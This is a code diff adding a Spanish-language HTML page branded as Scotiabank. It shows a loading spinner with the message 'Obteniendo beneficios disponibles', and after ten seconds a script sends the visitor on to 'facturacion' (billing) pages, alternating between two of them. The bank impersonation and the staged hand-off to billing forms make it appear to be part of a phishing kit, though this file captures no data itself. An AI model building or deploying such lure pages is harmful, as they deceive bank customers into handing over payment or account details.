@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Scotiabank</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+    }
+
+    .container {
+      text-align: center;
+      font-family: Verdana;
+      max-width: 800px;
+      margin: 50px auto;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    h1 {
+      color: #343348;
+      margin-top: 0px;
+      margin-bottom: 10px;
+    }
+
+    .boton {
+      cursor: pointer;
+      background: #e20303;
+      color: #F4F4F4ff;
+      border-radius: 4px;
+      border: none;
+      padding: 6px 16px;
+      width: 250px;
+      height: 40px;
+      font-size: 0.875rem;
+      line-height: 1.75;
+      letter-spacing: 0.02857em;
+      transition: background-color 250ms ease;
+      box-shadow: 0px 3px 1px -2px rgba(0, 0, 0, 0.2),
+        0px 2px 2px 0px rgba(0, 0, 0, 0.14),
+        0px 1px 5px 0px rgba(0, 0, 0, 0.12);
+    }
+
+    .boton:hover {
+      text-decoration: none;
+      background-color: #e20303;
+    }
+
+    .footer-content {
+      text-align: center;
+      font-family: Verdana;
+      color: #6c757d;
+      font-size: 12px;
+      padding: 20px;
+    }
+
+    footer {
+      position: fixed;
+      left: 0;
+      bottom: 0;
+      width: 100%;
+      background-color: #f4f4f4;
+    }
+
+    .loader {
+      width: 78px;
+      height: 78px;
+      display: inline-block;
+      background: radial-gradient(
+        ellipse at center,
+        #e20303 0%,
+        #e20303 14%,
+        #f4f4f4ff 15%,
+        #f4f4f4ff 100%
+      );
+      background-size: cover;
+      background-position: center;
+      border-radius: 50%;
+      position: relative;
+    }
+
+    .loader::after,
+    .loader::before {
+      content: "";
+      position: absolute;
+      height: 16px;
+      width: 4px;
+      background: #e20303;
+      top: 50%;
+      left: 50%;
+      transform: translateX(-50%) rotate(0deg);
+      transform-origin: 25% 0;
+      animation: rotation 10s linear infinite;
+    }
+
+    .loader::before {
+      height: 22px;
+      width: 2px;
+      animation-duration: 1s;
+    }
+
+    @keyframes rotation {
+      0% {
+        transform: rotate(0deg);
+      }
+      100% {
+        transform: rotate(360deg);
+      }
+    }
+  </style>
+
+  <script>
+    // Redirigir después de 10 segundos de forma alternada entre dos páginas
+    window.addEventListener("DOMContentLoaded", () => {
+      const lastPage = localStorage.getItem("lastPage");
+      const next = lastPage === "2" ? "facturacion.html" : "facturacion2.html";
+      const newVal = next === "facturacion2.html" ? "2" : "1";
+      localStorage.setItem("lastPage", newVal);
+
+      setTimeout(() => {
+        window.location.href = next;
+      }, 10000); // 10 segundos
+    });
+  </script>
+</head>
+<body>
+  <header>
+    <img alt="Logo" src="favicon-280x280.jpg" width="60" />
+  </header>
+
+  <section class="container">
+    <div>
+      <br /><br />
+      <span class="loader"></span><br /><br />
+      <h1 class="title">Obteniendo beneficios disponibles</h1>
+      <p>Espera un momento, ya casi estamos.</p>
+    </div>
+  </section>
+
+  <footer>
+    <div class="footer-content">SCOTIABANK</div>
+  </footer>
+</body>
+</html>
